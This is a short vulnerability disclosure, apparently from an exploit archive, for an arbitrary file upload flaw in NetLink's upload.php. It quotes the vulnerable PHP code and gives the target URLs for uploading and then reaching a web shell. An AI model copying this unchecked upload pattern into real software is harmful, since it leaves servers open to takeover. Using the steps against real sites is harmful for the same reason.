======================================
NetLink Remote Arbitrary File Upload Vulnerability
Download: http://sourceforge.net/projects/kp-netlink/
by lumut--
Homepage: lumutcherenza.biz
======================================

[upload.php]

<?php
extract($_POST);
if ($submit)
{
  $file_name=$_FILES['filename']['name'];
    $file_type=$_FILES['filename']['type'];
    $file_tmp=$_FILES['filename']['tmp_name'];
    $file_size=$_FILES['filename']['size'];

    $user=$_SESSION['login'];
    echo "Upload Stats:<br/>";
    echo "<blockquote style='font-size:10pt;'>";
    echo "Filename: ".$file_name;
    echo "<br/>File Type: ".$file_type;
    echo "<br/>File Size: ".$file_size;

    #now that the stats have been declared & displayed, now we process and
upload the file
    $file_dest = "Users/$user/";
    $file_dest = $file_dest . $_FILES['filename']['name'];

    echo "<br/><br/>Copying $file_name....";
    echo "<br/>Moving copied file to $user's account...";
    echo "</blockquote>";
    if (move_uploaded_file($_FILES['filename']['tmp_name'], $file_dest))
          print "File '$file_name' was successfully uploaded to account
<b>$user</b>.<br/> ";
    else
    {
      print "Possible file upload attack!  Here's some debugging info:\n";
      print_r($_FILES);
    }
    touch("Users/$user/$file_name");
include("options.php");
echo "<hr color='#000000'/>";
}

?>


expl: http://[target]/[netlink_path]/upload.php
shell: http://[target]/[netlink_path]/Users/yourshell.php

======================================================================

thx to : cr4wl3r, Team_elitE, kisame, aNtI_hAcK, kazuya, PunkRock and
manadocoding team :D
======================================================================
